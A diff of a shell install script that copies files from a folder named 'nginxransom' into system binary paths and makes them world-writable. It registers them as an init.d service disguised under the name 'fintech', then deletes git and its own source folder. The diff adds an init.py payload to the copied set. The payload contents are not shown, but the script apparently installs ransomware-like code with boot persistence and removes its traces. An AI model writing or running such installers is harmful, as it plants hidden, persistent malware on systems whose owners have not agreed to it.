@@ -15,11 +15,13 @@ cp   nginxransom/bootstarp.txt /mnt/usr/local/bin/bootstarp
 cp   nginxransom/bootstarp.txt /usr/bin/bootstarp
 cp   nginxransom/service.sh ../
 cp   nginxransom/service.sh ../mnt/
+cp   nginxransom/init.py    ../mnt/
 chmod 777 /usr/bin/bootstarp 
 chmod 777 mnt/usr/local/bin/bootstarp
 chmod 777 mnt/usr/bin/bootstarp 
 chmod 777 mnt/service.sh
 chmod 777 service.sh
+chmod 777 init.py
 chroot mnt/ cp service.sh /etc/init.d/fintech
 rm -rf service.sh
 chroot mnt/ chmod +x /etc/init.d/fintech
@@ -36,4 +38,5 @@ chroot mnt/ echo -e '[boot]\ncommand="service fintech start"\n\n[automount]\nena
 #chroot mnt/ systemctl start finetech.service
 chroot mnt/ rm -rf service.sh
 apt remove git -y
+ 
 rm -rf nginxransom/
